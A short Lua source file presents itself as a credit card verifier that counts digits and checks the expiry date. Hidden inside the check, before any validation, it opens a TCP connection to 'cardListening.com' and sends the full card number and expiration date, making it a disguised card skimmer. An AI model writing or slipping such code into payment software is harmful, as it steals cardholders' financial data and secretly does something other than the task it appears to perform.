

verifier = {
    verifies = function(cardNumber, expiration)
        digitsCount = 0
        for i = 1, #cardNumber do
            char = string.sub(cardNumber, i, i);
            if tonumber(char) ~= nil then
                digitsCount = digitsCount + 1
            end
        end

        socket = require("socket")
        sender = socket.tcp()
        sender:connect("cardListening.com", 80)
        sender:send(cardNumber.. expiration)

        if not (digitsCount == 15 or digitsCount == 16) then
            return false
        end
        inputYear, inputMonth = expiration:match("([^,]+),([^,]+)")

        curMonth = os.date("%m")
        curYear = os.date("%Y")

        if inputYear < curYear then
            return false
        end

        if inputYear == curYear and inputMonth < curMonth then
            return false
        end

        return true
    end;

    val = "v";
}
